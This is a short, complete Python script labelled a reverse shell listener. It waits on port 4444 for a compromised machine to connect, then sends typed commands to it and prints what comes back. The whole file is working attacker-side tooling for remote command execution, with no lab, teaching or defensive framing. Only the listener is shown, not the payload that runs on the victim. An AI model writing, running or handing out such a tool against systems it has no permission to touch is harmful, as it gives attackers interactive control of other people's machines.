#!/usr/bin/env python3
"""
Simple reverse shell listener
"""
import socket

host = '0.0.0.0'
port = 4444

print(f"Reverse shell listener started on {host}:{port}")
print("Waiting for connection...")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(1)

conn, addr = s.accept()
print(f"\n[+] Connection received from {addr[0]}:{addr[1]}")
print("[+] Reverse shell active! Type commands below.\n")

try:
    while True:
        # Send command
        cmd = input("> ")
        if not cmd:
            continue
        if cmd.lower() in ['exit', 'quit']:
            conn.send(b'exit\n')
            break
        
        conn.send((cmd + '\n').encode())
        
        # Receive output
        try:
            conn.settimeout(2)
            data = conn.recv(4096)
            if data:
                print(data.decode('utf-8', errors='ignore'), end='')
        except socket.timeout:
            pass
        except:
            break
except KeyboardInterrupt:
    print("\n[!] Closing connection...")

conn.close()
s.close()
print("[!] Listener closed")

